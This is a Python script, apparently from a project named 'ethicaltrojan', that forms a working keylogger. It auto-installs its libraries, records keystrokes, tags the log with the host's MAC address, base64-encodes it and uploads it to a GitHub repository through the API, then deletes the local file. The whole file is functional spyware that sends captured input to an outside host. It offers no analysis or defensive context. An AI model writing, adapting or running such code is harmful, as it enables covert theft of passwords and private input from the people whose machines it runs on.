import subprocess
import sys
import time
import json
import os
import base64


def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

required_packages = ['keyboard', 'psutil', 'requests']
for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        print(f"{package} not found. Installing...")
        install(package)
import psutil
import requests
import keyboard

def load_github_token():
    config_file = "config.json"
    if os.path.exists(config_file):
        with open(config_file, 'r') as file:
            config = json.load(file)
            return config.get("GITHUB_TOKEN", "")
    else:
        print("Config file not found!")
        return ""

GITHUB_TOKEN = load_github_token()
REPO_OWNER = "jonas638"
REPO_NAME = "ethicaltrojan"
FOLDER_PATH = "keylog"
LOG_FILE = 'keylog.txt'

def get_mac_address():
    for interface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == psutil.AF_LINK:
                mac_address = addr.address
                if mac_address and mac_address != "00:00:00:00:00:00":
                    return mac_address.replace(":", "-").lower()
    return "00-00-00-00-00-00"

def log_key_events(duration=300):
    start_time = time.time()
    with open(LOG_FILE, 'a') as log_file:
        print("Logging key events to the file...")
        while (time.time() - start_time) < duration:
            try:
                key_event = keyboard.read_event()
                if key_event.event_type == keyboard.KEY_DOWN:
                    if key_event.name == 'enter':
                        log_file.write('\n')
                    else:
                        log_file.write(key_event.name)
                    log_file.flush()
                elapsed_time = time.time() - start_time
                if elapsed_time >= duration:
                    break
                time.sleep(0.01)
            except KeyboardInterrupt:
                print("Keylogger stopped.")
                break
            except Exception as e:
                print(f"An error occurred: {e}")
                break

def upload_keylog_to_github(file_path, mac_address):
    with open(file_path, 'r') as file:
        content = file.read()

    encoded_content = base64.b64encode(content.encode()).decode()

    upload_path = f"{FOLDER_PATH}/{mac_address}-keylog.txt"
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{upload_path}"

    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json",
    }

    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        sha = response.json()["sha"]
        message = "Updating keylog file"
    else:
        sha = None
        message = "Creating keylog file"

    payload = {
        "message": message,
        "content": encoded_content,
    }
    if sha:
        payload["sha"] = sha

    response = requests.put(url, headers=headers, data=json.dumps(payload))

    if response.status_code in [200, 201]:
        print(f"File '{upload_path}' uploaded successfully!")
        delete_log_file(file_path)
    else:
        print(f"Failed to upload file: {response.status_code}")
        print(response.json())

def delete_log_file(file_path):
    try:
        os.remove(file_path)
        print(f"Log file '{file_path}' deleted successfully.")
    except Exception as e:
        print(f"Failed to delete log file '{file_path}': {e}")

def main():
    mac_address = get_mac_address()
    log_key_events(duration=5)
    upload_keylog_to_github(LOG_FILE, mac_address)

if __name__ == "__main__":
    main()
